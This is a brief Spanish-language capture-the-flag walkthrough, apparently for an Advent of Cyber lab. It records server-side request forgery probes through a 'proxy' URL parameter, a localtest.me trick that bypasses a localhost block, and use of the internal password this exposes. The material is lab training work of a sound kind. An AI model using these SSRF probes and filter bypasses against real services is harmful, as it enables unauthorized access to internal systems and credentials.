# Day 19



http://10.10.36.146/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3DTib3rius
http://10.10.36.146/?proxy=http://list.hohoho:8080/search.php?name=Tib3rius

- Probar la ruta raiz

```
http://10.10.36.146/?proxy=http://list.hohoho:8080/

The requested URL was not found on this server.
```

- Probar otro puerto
```
http://10.10.36.146/?proxy=http://list.hohoho:80/search.php?name=Tib3rius

Failed to connect to list.hohoho port 80: Connection refused
```
``` 
http://10.10.36.146/?proxy=http://list.hohoho:22/search.php?name=Tib3rius

Recv failure: Connection reset by peer
```

- Probar cambiando el host
```
http://10.10.36.146/?proxy=http://localhost:8080/

Your search has been blocked by our security team.
```

- Probar agregando un dominio falso 

``` 
http://10.10.36.146/?proxy=http://list.hohoho.localtest.me:80/

Santa,

If you need to make any changes to the Naughty or Nice list, you need to login.

I know you have trouble remembering your password so here it is: Be good for goodness sake!

- Elf McSkidy
```

- Ingresar al portal
S anta
Be good for goodness sake!
 
